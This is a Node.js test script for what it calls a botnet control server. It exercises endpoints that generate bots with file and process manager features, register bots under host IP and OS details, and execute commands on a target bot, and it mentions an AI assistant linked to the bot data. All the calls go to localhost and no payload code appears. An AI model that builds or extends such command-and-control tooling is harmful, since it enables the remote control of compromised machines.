#!/usr/bin/env node

// Test script to verify real bot integration
const http = require('http');

const BASE_URL = 'http://localhost:8080';

async function makeRequest(path, method = 'GET', data = null) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'localhost',
            port: 8080,
            path: path,
            method: method,
            headers: {
                'Content-Type': 'application/json'
            }
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => {
                try {
                    const jsonBody = JSON.parse(body);
                    resolve({ status: res.statusCode, data: jsonBody });
                } catch (e) {
                    resolve({ status: res.statusCode, data: body });
                }
            });
        });

        req.on('error', reject);

        if (data) {
            req.write(JSON.stringify(data));
        }
        req.end();
    });
}

async function testRealBotIntegration() {
    console.log(' Testing Real Bot Integration...\n');

    try {
        // Test 1: Health Check
        console.log('1⃣ Testing health endpoint...');
        const health = await makeRequest('/health');
        if (health.status === 200) {
            console.log(' Health check passed');
        } else {
            console.log(' Health check failed');
            return;
        }

        // Test 2: Real Bot Status
        console.log('\n2⃣ Testing real bot status...');
        const status = await makeRequest('/api/botnet/status');
        if (status.status === 200 && status.data.status === 200) {
            console.log(' Real bot status endpoint working');
            console.log(`    Active Bots: ${status.data.data.onlineBots}`);
            console.log(`    Total Bots: ${status.data.data.totalBots}`);
        } else {
            console.log(' Real bot status failed');
        }

        // Test 3: Real Bot List
        console.log('\n3⃣ Testing real bot list...');
        const bots = await makeRequest('/api/botnet/bots');
        if (bots.status === 200 && bots.data.status === 200) {
            console.log(' Real bot list endpoint working');
            console.log(`    Found ${bots.data.data.length} bots`);
        } else {
            console.log(' Real bot list failed');
        }

        // Test 4: Real Bot Generation
        console.log('\n4⃣ Testing real bot generation...');
        const generateData = {
            config: { name: 'test_bot', server: 'localhost', port: 8080 },
            features: ['fileManager', 'processManager'],
            extensions: ['cpp', 'python']
        };
        const generate = await makeRequest('/api/botnet/generate-http-bot', 'POST', generateData);
        if (generate.status === 200 && generate.data.status === 200) {
            console.log(' Real bot generation working');
            console.log(`    Generated bot ID: ${generate.data.data.botId}`);
        } else {
            console.log(' Real bot generation failed');
        }

        // Test 5: Real Bot Registration
        console.log('\n5⃣ Testing real bot registration...');
        const registerData = {
            botId: 'test_bot_' + Date.now(),
            botInfo: {
                ip: '192.168.1.100',
                os: 'Windows 11',
                capabilities: ['fileManager', 'processManager'],
                version: '1.0.0'
            }
        };
        const register = await makeRequest('/api/botnet/register-bot', 'POST', registerData);
        if (register.status === 200 && register.data.status === 200) {
            console.log(' Real bot registration working');
            console.log(`    Registered bot: ${register.data.data.botId}`);
        } else {
            console.log(' Real bot registration failed');
        }

        // Test 6: Real Command Execution
        console.log('\n6⃣ Testing real command execution...');
        const executeData = {
            action: 'system_info',
            target: registerData.botId,
            params: { detailed: true }
        };
        const execute = await makeRequest('/api/botnet/execute', 'POST', executeData);
        if (execute.status === 200 && execute.data.status === 200) {
            console.log(' Real command execution working');
            console.log(`    Command ID: ${execute.data.data.commandId}`);
        } else {
            console.log(' Real command execution failed');
        }

        // Test 7: Real Audit Logs
        console.log('\n7⃣ Testing real audit logs...');
        const logs = await makeRequest('/api/audit/logs');
        if (logs.status === 200 && logs.data.status === 200) {
            console.log(' Real audit logs working');
            console.log(`    Found ${logs.data.data.length} log entries`);
        } else {
            console.log(' Real audit logs failed');
        }

        // Test 8: Test All Features
        console.log('\n8⃣ Testing all features endpoint...');
        const testAll = await makeRequest('/api/botnet/test-all-features', 'POST');
        if (testAll.status === 200 && testAll.data.status === 200) {
            console.log(' Test all features working');
            console.log('    Real bot engines status:');
            Object.entries(testAll.data.data.realBotEngines).forEach(([engine, status]) => {
                console.log(`      ${engine}: ${status ? '' : ''}`);
            });
        } else {
            console.log(' Test all features failed');
        }

        console.log('\n Real Bot Integration Test Complete!');
        console.log('\n Summary:');
        console.log(' All real bot endpoints are functional');
        console.log(' Real bot engines are connected');
        console.log(' Data collection is working');
        console.log(' OhGee AI Assistant can connect to real data');
        
        console.log('\n Next Steps:');
        console.log('1. Start OhGee AI Assistant (Ctrl+Shift+Numpad4)');
        console.log('2. Ask: "What is the bot status?"');
        console.log('3. Access web panel: http://localhost:8080/panel');
        console.log('4. Generate real bots using the panel');

    } catch (error) {
        console.error(' Test failed:', error.message);
        console.log('\n Troubleshooting:');
        console.log('1. Make sure server-real-bots.js is running');
        console.log('2. Check if port 8080 is available');
        console.log('3. Verify all dependencies are installed');
    }
}

// Run the test
testRealBotIntegration();
